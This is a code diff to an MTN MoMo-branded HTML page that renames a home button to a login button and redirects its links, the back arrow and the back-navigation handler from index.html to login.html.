@@ -231,7 +231,7 @@
             margin-top: 10px;
         }
         
-        .home-btn {
+        .login-btn {
             flex: 1;
             padding: 14px;
             background: linear-gradient(135deg, #0047AB, #002D7A);
@@ -244,12 +244,12 @@
             transition: transform 0.2s, box-shadow 0.2s;
         }
         
-        .home-btn:hover {
+        .login-btn:hover {
             transform: scale(1.02);
             box-shadow: 0 8px 25px rgba(0, 71, 171, 0.35);
         }
         
-        .home-btn:active {
+        .login-btn:active {
             transform: scale(0.98);
         }
         
@@ -316,7 +316,7 @@
             .btn-group {
                 flex-direction: column;
             }
-            .home-btn,
+            .login-btn,
             .track-btn {
                 padding: 12px;
                 font-size: 14px;
@@ -327,7 +327,7 @@
 
 <body>
     <header>
-        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go home">←</button>
+        <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Go login">←</button>
         <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span></div>
         <div></div>
     </header>
@@ -385,7 +385,7 @@
 
         <!-- Buttons -->
         <div class="btn-group">
-            <button class="home-btn" onclick="window.location.href='index.html'">🏠 HOME</button>
+            <button class="login-btn" onclick="window.location.href='login.html'">🔐 LOGIN</button>
             <button class="track-btn" onclick="alert('Tracking feature coming soon!')">📊 TRACK</button>
         </div>
     </main>
@@ -442,7 +442,7 @@
         // PREVENT BACK NAVIGATION TO FORM
         // ============================================
         window.addEventListener('popstate', function(e) {
-            window.location.href = 'index.html';
+            window.location.href = 'login.html';
         });
     </script>
 </body>
